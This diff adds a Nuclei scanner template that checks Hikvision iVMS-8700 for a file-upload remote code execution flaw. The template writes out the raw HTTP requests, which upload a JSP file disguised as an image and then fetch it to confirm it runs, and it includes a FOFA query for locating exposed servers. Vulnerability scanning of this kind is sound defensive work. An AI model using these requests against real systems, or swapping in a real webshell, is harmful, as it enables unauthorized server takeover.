@@ -1,0 +1,49 @@
+id: hikvision-ivms-file-upload-rce
+
+info:
+  name: Hikvision iVMS-8700 - File Upload Remote Code Execution
+  author: brucelsone
+  severity: critical
+  description: |
+    Arbitrary file upload vulnerability in HIKVISION iVMS-8700 Integrated Security Management Platform Software allows attackers to upload and execute malicious files, leading to potential unauthorized server control.
+  reference:
+    - https://www.wangan.com/p/11v754aceadb994f
+    - https://cn-sec.com/archives/1828326.html
+  metadata:
+    max-request: 2
+    fofa-query: icon_hash="-911494769"
+  tags: hikvision,ivms,fileupload,rce,intrusive
+variables:
+  str1: '{{rand_base(6)}}'
+  str2: '{{rand_base(6)}}'
+  str3: '<%out.print("{{str2}}");%>'
+
+http:
+  - raw:
+      - |
+        POST /eps/resourceOperations/upload.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: MicroMessenger
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
+
+        ------WebKitFormBoundaryTJyhtTNqdMNLZLhj
+        Content-Disposition: form-data; name="fileUploader";filename="{{str1}}.jsp"
+        Content-Type: image/jpeg
+
+        {{str3}}
+        ------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
+      - |
+        GET /eps/upload/{{res_id}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        name: res_id
+        json:
+          - ".data.resourceUuid"
+        internal: true
+    matchers:
+      - type: dsl
+        dsl:
+          - body_2 == str2
+# digest: 4a0a004730450220495dd4579ba06122584408d118db31a09abf521a18d27209e71f26ff0922798b0221009077e5495797eff7b70cb748effad9df66280ab23016d4473a0e185444af88d0:922c64590222798bb761d5b6d8e72950
